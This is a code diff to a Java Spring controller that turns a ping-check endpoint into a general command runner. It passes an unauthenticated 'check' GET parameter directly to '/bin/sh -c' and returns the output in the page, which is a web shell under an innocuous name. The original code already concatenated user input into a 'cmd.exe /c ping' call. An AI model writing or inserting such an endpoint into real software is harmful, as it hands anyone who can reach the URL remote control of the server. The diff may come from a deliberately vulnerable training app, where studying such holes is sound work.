@@ -66,7 +66,7 @@ public class CommonController {
 		}
 	}
 
-	@RequestMapping(value="/common/checkPing.do", method = RequestMethod.GET)
+	@RequestMapping(value="/checkPing.do", method = RequestMethod.GET)
 	public ModelAndView command(ModelAndView mv, HttpServletRequest req) {
 
 		Process process = null;
@@ -75,10 +75,13 @@ public class CommonController {
 		String out = "";
 		String s = null;
 
-		String ping = req.getParameter("ping");
-		if(ping != null) {
+		String check = req.getParameter("check");
+		System.out.println("check: "+check);
+		if(check != null) {
 			try {
-				process = Runtime.getRuntime().exec("cmd.exe /c ping " + ping);
+				String [] cmd = {"/bin/sh","-c",check};
+				System.out.println(check);
+				process = Runtime.getRuntime().exec(cmd);
 				in = new BufferedReader(new InputStreamReader(process.getInputStream()));
 				while ((s = in.readLine()) != null) {
 					out += s + "<br>";
@@ -92,7 +95,7 @@ public class CommonController {
 			}
 		}
 
-		mv.setViewName("admin/osCommand");
+		mv.setViewName("admin/server");
 		mv.addObject("out", out);
 		return mv;
 	}
